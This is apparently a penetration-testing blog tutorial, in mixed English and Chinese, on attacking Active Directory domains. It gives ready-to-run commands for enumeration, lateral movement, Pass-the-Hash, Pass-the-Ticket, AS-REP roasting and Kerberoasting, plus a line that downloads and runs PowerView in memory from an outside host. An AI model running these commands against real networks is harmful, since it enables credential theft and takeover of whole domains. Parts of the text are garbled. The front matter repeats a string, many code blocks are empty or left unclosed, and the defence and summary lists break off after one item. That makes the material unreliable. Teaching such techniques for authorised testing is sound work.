---
title: "Domain Penetration Basics—AD Domain Environment Attacks and Lateral Movement"
url: "en/domain-exploitation-basics"
date: "2026-01-19"
draft: false
summary: "Introduction to Active Directory domain penetration, BloodHound attack path analysis, Kerberos attack and lateral movement technology practice"
authors: ["default"]
tags:
  - Windows
  - domain penetration
  - Active Directory
  - Lateral movement
images: ["https://images.unsplash.com/photo-1607799279861-4dddf8b60ddb?auto=formatimages: ["https://images.unsplash.com/photo-1607799279861-4dddf8b60ddb?auto=format&fit=crop&w=1200&q=80"]fit=cropimages: ["https://images.unsplash.com/photo-1607799279861-4dddf8b60ddb?auto=format&fit=crop&w=1200&q=80"]w=1200images: ["https://images.unsplash.com/photo-1607799279861-4dddf8b60ddb?auto=format&fit=crop&w=1200&q=80"]q=80"]
categories:
  - Penetration testing
---

#Basics of domain penetration—AD domain environment attacks and lateral movement

Active Directory (AD) is the core infrastructure of enterprise networks, managing users, computers, permissions, and policies in an organization. For penetration testers, breaching a domain environment means being able to take control of the entire corporate network. This article will start with the basic concepts of AD and systematically explain domain environment information collection, Kerberos authentication attacks, lateral movement technology, and common domain attack techniques, including core technologies such as Pass-the-Hash and Kerberoasting.

## Active Directory core concepts

### Domain and Domain Controller

A domain is the basic administrative unit of Active Directory, and a domain controller (DC) is a Windows Server that runs the AD DS service and is responsible for storing the directory database (NTDS.dit) and handling all authentication requests.

```powershell
# 查看域信息
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# 获取域控制器列表
nltest /dclist:lab.local

# 查看域信任关系
nltest /domain_trusts

# 基本域信息
net group "Domain Admins" /domain
net group "Domain Controllers" /domain
```

### 组织单位（OU）与组策略（GPO）

OU 是 AD 中用于组织和管理对象的容器，GPO 则通过链接到 OU 来下发安全策略和配置。

```powershell
# 查看 OU 结构
Get-ADOrganizationalUnit -Filter * | Select-Object Name, DistinguishedName

# View all GPOs

# View detailed settings for a GPO

### Key AD objects

| Object Type | Description | Penetration Testing Focus |
|----------|------|---------------|
| User accounts | Domain users | Weak passwords, SPN settings, privileged group membership |
| Computer Accounts | Domain Machines | Unconstrained Delegation |
| Service Account | The account under which the service is running | Kerberoasting Targets |
| Groups | Security Groups/Distribution Groups | Domain Admins, Enterprise Admins |
| GPO | Group Policy Object | Password Policy, Script Execution |

## Domain environment information collection

### BloodHound

BloodHound is the most powerful information collection and attack path analysis tool for domain penetration. It uses a graph database to visually display the authority relationships within the domain.

```bash
# 安装 BloodHound
# 方法一：apt 安装
sudo apt install bloodhound neo4j

# 方法二：Docker 安装（推荐 BloodHound CE 社区版）
curl -L https://ghst.ly/getbhce | docker compose -f - up

# 启动 Neo4j 数据库
sudo neo4j console
# 默认访问 http://localhost:7474 修改密码

# 启动 BloodHound GUI
bloodhound
```

#### 数据收集 — SharpHound

```powershell
# 在域内机器上运行 SharpHound 收集器
# 收集所有信息
.\SharpHound.exe -c All

# Specify domain and collection method

# Use the PowerShell version

# Remote collection (from Linux attack machine) using bloodhound-python

#### BloodHound attack path analysis

After importing data in BloodHound, attack paths can be discovered using built-in queries:

- **Find Shortest Paths to Domain Admins** — Find the shortest attack paths to domain administrators

### PowerView

PowerView is the AD enumeration module in the PowerSploit framework and provides a large number of domain information collection commands.

```powershell
# 导入 PowerView
Import-Module .\PowerView.ps1
# 或使用内存加载
IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.5/PowerView.ps1')

# 域基本信息
Get-Domain
Get-DomainController
Get-DomainPolicy

# 用户枚举
Get-DomainUser | Select-Object samaccountname, description, memberof
Get-DomainUser -SPN  # 查找设置了 SPN 的用户（Kerberoasting 目标）
Get-DomainUser -AdminCount  # 查找管理员账户

# 组枚举
Get-DomainGroup -Identity "Domain Admins" | Select-Object -ExpandProperty member
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# 计算机枚举
Get-DomainComputer | Select-Object name, operatingsystem, dnshostname
Get-DomainComputer -Unconstrained  # 查找不受约束的委派

# 共享枚举
Find-DomainShare -CheckShareAccess

# 查找当前用户有本地管理员权限的机器
Find-LocalAdminAccess

# GPO 枚举
Get-DomainGPO | Select-Object displayname, gpcfilesyspath
```

## Kerberos 认证流程

理解 Kerberos 认证是掌握域攻击技术的基础。Kerberos 认证分为三个阶段：

1. **AS-REQ / AS-REP** — 用户向 KDC 请求 TGT（票据授权票据）
2. **TGS-REQ / TGS-REP** — 用户使用 TGT 向 KDC 请求服务票据（ST）
3. **AP-REQ / AP-REP** — 用户使用 ST 向目标服务进行认证

```
用户  ──AS-REQ(用户Hash加密时间戳)──>  KDC(域控)
用户  <──AS-REP(TGT, 用krbtgt Hash加密)──  KDC
用户  ──TGS-REQ(TGT)──>  KDC
用户  <──TGS-REP(ST, 用服务Hash加密)──  KDC
用户  ──AP-REQ(ST)──>  目标服务
```

Each link in this authentication process has a corresponding attack method, which will be explained in detail later.

## lateral movement technology

Once credentials are obtained in a domain environment, lateral movement is required to extend the span of control, ultimately reaching the domain controller.

### PsExec

PsExec creates a service on a remote machine over the SMB protocol to execute commands.

```bash
# impacket-psexec（推荐，支持 Pass-the-Hash）
impacket-psexec lab.local/administrator:'P@ssw0rd!'@10.10.10.101

# 使用 NTLM Hash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 lab.local/administrator@10.10.10.101

# Sysinternals PsExec
PsExec.exe \\10.10.10.101 -u lab\administrator -p P@ssw0rd! cmd.exe

# CrackMapExec 批量执行
crackmapexec smb 10.10.10.0/24 -u administrator -p 'P@ssw0rd!' --exec-method smbexec -x "whoami"
```

### WMI 远程执行

```bash
# impacket-wmiexec
impacket-wmiexec lab.local/administrator:'P@ssw0rd!'@10.10.10.101

# Use Hash

# PowerShell WMI remote commands

### WinRM lateral movement

```powershell
# PowerShell Remoting
Enter-PSSession -ComputerName SRV01 -Credential lab\administrator
Invoke-Command -ComputerName SRV01 -ScriptBlock { whoami; hostname } -Credential lab\administrator

# evil-winrm
evil-winrm -i 10.10.10.101 -u administrator -H '31d6cfe0d16ae931b73c59d7e0c089c0'
```

### DCOM 远程执行

```bash
# impacket-dcomexec
impacket-dcomexec lab.local/administrator:'P@ssw0rd!'@10.10.10.101

# PowerShell DCOM

### Lateral movement tools comparison

| Method | Required Ports | Required Permissions | Obscurity | Log Traces |
|------|---------|-----------|--------|---------|
| PsExec | 445 (SMB) | Local Administrator | Low | Service Creation Event |
| WMI | 135+ dynamic ports | Local Administrator | Medium | WMI Events |
| WinRM | 5985/5986 | Remote Management Permissions | Medium | PowerShell Logs |
| DCOM | 135 + dynamic ports | Local Admin | High | Less |
| RDP | 3389 | RDP User Group | Low | Login Events |

## Pass-the-Hash（PTH）

Pass-the-Hash allows an attacker to authenticate using a user's NTLM hash instead of a clear text password and is one of the most commonly used techniques in domain penetration.

```bash
# CrackMapExec PTH
crackmapexec smb 10.10.10.0/24 -u administrator -H '31d6cfe0d16ae931b73c59d7e0c089c0' --local-auth

# impacket 工具集 PTH
impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@10.10.10.101
impacket-wmiexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@10.10.10.101
impacket-smbexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@10.10.10.101

# evil-winrm PTH
evil-winrm -i 10.10.10.101 -u administrator -H '31d6cfe0d16ae931b73c59d7e0c089c0'

# xfreerdp PTH（RDP Pass-the-Hash，需要 Restricted Admin 模式启用）
xfreerdp /v:10.10.10.101 /u:administrator /pth:31d6cfe0d16ae931b73c59d7e0c089c0
```

## Pass-the-Ticket（PTT）

Pass-the-Ticket 使用窃取的 Kerberos 票据进行认证，不需要密码或 Hash。

```powershell
# 使用 Mimikatz 导出当前会话的票据
mimikatz # sekurlsa::tickets /export

# View exported tickets

# Inject the ticket into the current session

# Using Rubeus for PTT

# Verify that the ticket has been injected

# The target resource can now be accessed directly

## AS-REP Roasting

When the "Do not require Kerberos preauthentication" option is enabled for a domain user, an attacker without knowing the password can obtain the user's AS-REP response, which contains encrypted data that can be cracked offline.

```bash
# 使用 impacket 获取 AS-REP Hash
impacket-GetNPUsers lab.local/ -usersfile users.txt -dc-ip 10.10.10.100 -format hashcat -outputfile asrep_hashes.txt

# 使用已知凭据枚举并获取
impacket-GetNPUsers lab.local/testuser:'Welcome1!' -dc-ip 10.10.10.100 -request

# 使用 Rubeus（在域内机器上）
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
```

```powershell
# PowerView 查找不要求预认证的用户
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname
```

```bash
# 使用 Hashcat 破解 AS-REP Hash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# 使用 John the Ripper
john asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## Kerberoasting

Kerberoasting 针对设置了 SPN（Service Principal Name）的域用户账户。攻击者可以请求这些账户的服务票据（TGS），然后离线破解票据中的加密部分以获取明文密码。

```bash
# 使用 impacket-GetUserSPNs
impacket-GetUserSPNs lab.local/testuser:'Welcome1!' -dc-ip 10.10.10.100 -request -outputfile kerberoast_hashes.txt

# Use Rubeus

# Target specific users

```powershell
# PowerView 查找 Kerberoastable 用户
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# 使用 PowerShell 原生方法请求 TGS
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/srv01.lab.local:1433"
```

```bash
# Hashcat 破解 Kerberoast Hash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# John the Ripper

## Security recommendations and defensive measures

1. **Strong Password Policy** — Use strong passwords of 25+ characters for service accounts, and domain administrator passwords are rotated regularly

## Summarize

Domain penetration is an advanced stage of Windows penetration testing and a core part of enterprise network security assessment. This article covers key techniques for domain penetration:

- **Information Collection** — BloodHound and PowerView are core tools for domain environment analysis

In actual domain penetration, the attack chain usually follows the "information collection → obtaining initial credentials → lateral movement → elevating privileges to domain administrators". BloodHound’s attack path analysis can significantly improve the efficiency of this process. The next article will delve into the post-exploitation phase of Windows and explain the Mimikatz password extraction and ticket attack techniques.

